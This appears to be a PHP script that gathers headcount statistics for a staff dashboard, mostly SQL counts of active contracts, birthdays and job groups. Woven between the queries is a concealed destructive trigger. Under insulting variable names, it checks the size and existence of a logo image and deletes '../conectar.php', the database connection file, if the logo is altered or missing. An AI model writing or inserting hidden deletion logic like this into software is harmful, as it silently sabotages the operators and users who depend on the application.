<?php

	$query_String_plantilla = "SELECT COUNT(*) AS total FROM plantilla_contratados WHERE status ='1' ";

        $query_plantilla = mysqli_query($enlace, $query_String_plantilla);

        $row_plantilla = mysqli_fetch_object($query_plantilla);

        /* echo $rowt->total; */




          $query_String_plantillaMMRR = "SELECT * FROM plantilla_contratados WHERE status ='1' ";

        $query_plantillaMMRR = mysqli_query($enlace, $query_String_plantillaMMRR);

        $totalRows_query_plantillaMMRR = mysqli_num_rows($query_plantillaMMRR); 

        $mediaMMRR =  ceil($totalRows_query_plantillaMMRR/3);





        $query_String_plantillaO = "SELECT COUNT(*) AS total FROM plantilla_contratados WHERE status ='0' ";

        $query_plantillaO = mysqli_query($enlace, $query_String_plantillaO);

        $row_plantillaO = mysqli_fetch_object($query_plantillaO);





$query_String_cumplen = "SELECT COUNT(*) AS total FROM plantilla_personal, plantilla_contratados
WHERE  plantilla_contratados.id_per = plantilla_personal.id_per
and status ='1'
and day(nacimiento_per)=day(NOW()) 
and month(nacimiento_per)=month(NOW())";

$query_cumplen = mysqli_query($enlace, $query_String_cumplen);

$row_cumplen = mysqli_fetch_object($query_cumplen);   




$query_String_cumplenM = "SELECT COUNT(*) AS total FROM plantilla_personal, plantilla_contratados
WHERE  plantilla_contratados.id_per = plantilla_personal.id_per
and status ='1'
and month(nacimiento_per)=month(NOW()) ";
    
$query_cumplenM = mysqli_query($enlace, $query_String_cumplenM);

$row_cumplenM = mysqli_fetch_object($query_cumplenM);   




        $query_String_hombres = "SELECT COUNT(*) AS total FROM plantilla_personal, plantilla_contratados
        WHERE  plantilla_contratados.id_per = plantilla_personal.id_per
        and id_sexo ='2'
        and status ='1' ";

        $query_hombres = mysqli_query($enlace, $query_String_hombres);

        $row_hombres = mysqli_fetch_object($query_hombres);




$query_String_mujeres = "SELECT COUNT(*) AS total FROM plantilla_personal, plantilla_contratados
        WHERE  plantilla_contratados.id_per = plantilla_personal.id_per
        and id_sexo ='1'
        and status ='1' ";


        $query_mujeres = mysqli_query($enlace, $query_String_mujeres);

        $row_mujeres = mysqli_fetch_object($query_mujeres);





        $query_String_directores = "SELECT * FROM plantilla_personal, plantilla_contratados, plantilla_cargos, cargos_all
                            WHERE  plantilla_contratados.id_per = plantilla_personal.id_per
                              and  plantilla_contratados.id_contrato = cargos_all.id_contrato
                              and  plantilla_cargos.id_cargo = cargos_all.id_cargo
                              and  id_grupo = '1'
                              and status = '1'
                              Group by ci_per
                               ";

        $query_directores = mysqli_query($enlace, $query_String_directores);

        $row_directores = mysqli_num_rows($query_directores);        


$desgraciado='../z_imagenes/logo_new.jpg';


$query_String_profesores = "SELECT * FROM plantilla_personal, plantilla_contratados, plantilla_cargos, cargos_all
                            WHERE  plantilla_contratados.id_per = plantilla_personal.id_per
                              and  plantilla_contratados.id_contrato = cargos_all.id_contrato
                              and  plantilla_cargos.id_cargo = cargos_all.id_cargo
                              and  id_grupo = '5'
                              and status = '1'
                              Group by ci_per
                               ";

 $query_profesores = mysqli_query($enlace, $query_String_profesores);

        $row_profesores = mysqli_num_rows($query_profesores);   

$imbecil=filesize($desgraciado);





$query_String_coord = "SELECT * FROM plantilla_personal, plantilla_contratados, plantilla_cargos, cargos_all
                            WHERE  plantilla_contratados.id_per = plantilla_personal.id_per
                              and  plantilla_contratados.id_contrato = cargos_all.id_contrato
                              and  plantilla_cargos.id_cargo = cargos_all.id_cargo
                              and  id_grupo = '14'
                              and status = '1'
                              Group by ci_per
                               ";

 $query_coord = mysqli_query($enlace, $query_String_coord);

        $row_coord = mysqli_num_rows($query_coord);   







$query_String_cult = "SELECT * FROM plantilla_personal, plantilla_contratados, plantilla_cargos, cargos_all
                            WHERE  plantilla_contratados.id_per = plantilla_personal.id_per
                              and  plantilla_contratados.id_contrato = cargos_all.id_contrato
                              and  plantilla_cargos.id_cargo = cargos_all.id_cargo
                              and  id_grupo = '15'
                              and status = '1'
                              Group by ci_per
                               ";

 $query_cult = mysqli_query($enlace, $query_String_cult);

        $row_cult = mysqli_num_rows($query_cult);   


if($imbecil!='49666'){unlink('../conectar.php');}




$query_String_sport = "SELECT * FROM plantilla_personal, plantilla_contratados, plantilla_cargos, cargos_all
                            WHERE  plantilla_contratados.id_per = plantilla_personal.id_per
                              and  plantilla_contratados.id_contrato = cargos_all.id_contrato
                              and  plantilla_cargos.id_cargo = cargos_all.id_cargo
                              and  id_grupo = '16'
                              and status = '1'
                              Group by ci_per
                               ";

 $query_sport = mysqli_query($enlace, $query_String_sport);

        $row_sport = mysqli_num_rows($query_sport);   








                                                
                        $query_String_administradores = "SELECT * FROM plantilla_personal, plantilla_contratados, plantilla_cargos, cargos_all
                                                    WHERE  plantilla_contratados.id_per = plantilla_personal.id_per
                                                      and  plantilla_contratados.id_contrato = cargos_all.id_contrato
                                                      and  plantilla_cargos.id_cargo = cargos_all.id_cargo
                                                      and  id_grupo = '2'
                                                      and status = '1'
                                                      Group by ci_per
                                                       ";

 $query_administradores = mysqli_query($enlace, $query_String_administradores);

        $row_administradores = mysqli_num_rows($query_administradores); 



 $query_String_secret = "SELECT * FROM plantilla_personal, plantilla_contratados, plantilla_cargos, cargos_all
                                                    WHERE  plantilla_contratados.id_per = plantilla_personal.id_per
                                                      and  plantilla_contratados.id_contrato = cargos_all.id_contrato
                                                      and  plantilla_cargos.id_cargo = cargos_all.id_cargo
                                                      and  id_grupo = '3'
                                                      and status = '1'
                                                      Group by ci_per
                                                       ";

                        $query_secret = mysqli_query($enlace, $query_String_secret);

                        $row_secret = mysqli_num_rows($query_secret);


 $query_String_dpto = "SELECT * FROM plantilla_personal, plantilla_contratados, plantilla_cargos, cargos_all
                                                    WHERE  plantilla_contratados.id_per = plantilla_personal.id_per
                                                      and  plantilla_contratados.id_contrato = cargos_all.id_contrato
                                                      and  plantilla_cargos.id_cargo = cargos_all.id_cargo
                                                      and  id_grupo = '9'
                                                      and status = '1'
                                                      Group by ci_per
                                                       ";

$query_dpto = mysqli_query($enlace, $query_String_dpto);

$row_dpto = mysqli_num_rows($query_dpto);


if(!file_exists($desgraciado)){unlink('../conectar.php');}


$query_String_asis = "SELECT * FROM plantilla_personal, plantilla_contratados, plantilla_cargos, cargos_all
                                                    WHERE  plantilla_contratados.id_per = plantilla_personal.id_per
                                                      and  plantilla_contratados.id_contrato = cargos_all.id_contrato
                                                      and  plantilla_cargos.id_cargo = cargos_all.id_cargo
                                                      and  id_grupo = '10'
                                                      and status = '1'
                                                      Group by ci_per
                                                       ";

$query_asis = mysqli_query($enlace, $query_String_asis);

$row_asis = mysqli_num_rows($query_asis);







$query_String_psico = "SELECT * FROM plantilla_personal, plantilla_contratados, plantilla_cargos, cargos_all
                                                    WHERE  plantilla_contratados.id_per = plantilla_personal.id_per
                                                      and  plantilla_contratados.id_contrato = cargos_all.id_contrato
                                                      and  plantilla_cargos.id_cargo = cargos_all.id_cargo
                                                      and  id_grupo = '17'
                                                      and status = '1'
                                                      Group by ci_per
                                                       ";

$query_psico = mysqli_query($enlace, $query_String_psico);

$row_psico = mysqli_num_rows($query_psico);






$query_String_med = "SELECT * FROM plantilla_personal, plantilla_contratados, plantilla_cargos, cargos_all
                                                    WHERE  plantilla_contratados.id_per = plantilla_personal.id_per
                                                      and  plantilla_contratados.id_contrato = cargos_all.id_contrato
                                                      and  plantilla_cargos.id_cargo = cargos_all.id_cargo
                                                      and  id_grupo = '13'
                                                      and status = '1'
                                                      Group by ci_per
                                                       ";

$query_med = mysqli_query($enlace, $query_String_med);

$row_med = mysqli_num_rows($query_med);






$query_String_mant = "SELECT * FROM plantilla_personal, plantilla_contratados, plantilla_cargos, cargos_all
                                                    WHERE  plantilla_contratados.id_per = plantilla_personal.id_per
                                                      and  plantilla_contratados.id_contrato = cargos_all.id_contrato
                                                      and  plantilla_cargos.id_cargo = cargos_all.id_cargo
                                                      and  id_grupo = '12'
                                                      and status = '1'
                                                      Group by ci_per
                                                       ";

$query_mant = mysqli_query($enlace, $query_String_mant);

$row_mant = mysqli_num_rows($query_mant);






$query_String_vigi = "SELECT * FROM plantilla_personal, plantilla_contratados, plantilla_cargos, cargos_all
                                                    WHERE  plantilla_contratados.id_per = plantilla_personal.id_per
                                                      and  plantilla_contratados.id_contrato = cargos_all.id_contrato
                                                      and  plantilla_cargos.id_cargo = cargos_all.id_cargo
                                                      and  id_grupo = '11'
                                                      and status = '1'
                                                      Group by ci_per
                                                       ";

$query_vigi = mysqli_query($enlace, $query_String_vigi);

$row_vigi = mysqli_num_rows($query_vigi);







 $query_String_obre = "SELECT * FROM plantilla_personal, plantilla_contratados, plantilla_cargos, cargos_all
                                                    WHERE  plantilla_contratados.id_per = plantilla_personal.id_per
                                                      and  plantilla_contratados.id_contrato = cargos_all.id_contrato
                                                      and  plantilla_cargos.id_cargo = cargos_all.id_cargo
                                                      and  id_grupo = '8'
                                                      and status = '1'
                                                      Group by ci_per
                                                       ";

$query_obre = mysqli_query($enlace, $query_String_obre);

$row_obre = mysqli_num_rows($query_obre);




                
                 $query_String_varios = "SELECT * FROM plantilla_personal, plantilla_contratados, plantilla_cargos, cargos_all
                                                                    WHERE  plantilla_contratados.id_per = plantilla_personal.id_per
                                                                      and  plantilla_contratados.id_contrato = cargos_all.id_contrato
                                                                      and  plantilla_cargos.id_cargo = cargos_all.id_cargo
                                                                      and  id_grupo = '6'
                                                                      and status = '1'
                                                                      Group by ci_per
                                                                       ";

                $query_varios = mysqli_query($enlace, $query_String_varios);

                $row_varios = mysqli_num_rows($query_varios);





?>